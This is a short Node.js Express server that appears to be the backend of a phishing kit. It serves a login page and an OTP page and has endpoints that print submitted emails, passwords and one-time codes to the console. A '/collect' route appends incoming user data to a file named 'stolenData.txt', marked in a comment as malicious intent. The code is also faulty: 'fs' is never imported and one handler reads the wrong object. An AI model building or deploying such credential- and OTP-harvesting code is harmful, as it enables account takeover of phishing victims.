const express = require('express')
const path = require('path')
const app = express();
const cors = require('cors');

// Enable CORS for all origins
app.use(cors());

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
// Route for serving the HTML page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname,'public/index.html'));
});

app.get('/Auth', (req, res) => {
    res.sendFile(path.join(__dirname,'/public/OtpPage.html'));
})

app.post('/crad/Login', (req, res) => {
    const email = req.body.email;
    const Password = req.body.password;
    console.log(`Email: ${email}.`)
    console.log(`Password: ${Password}.`)
    res.json({message: "Requested"})

})

app.post("/collect", (req, res) => {
console.log("Exucuted....")
    const userData = req.body;
    console.log("Received user data:", userData);

    // Save data to a file (malicious intent)
    fs.appendFileSync("stolenData.txt", JSON.stringify(userData) + "\n");
    res.status(200).send("Data received");
});

app.post('/AuthOtp', (req, res) => {
    console.log(res.body);
    const UserOtp = req.body.userOtp;
    console.log(UserOtp)
    res.json({message: "OTP IS SuccessFully Set"})
})

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
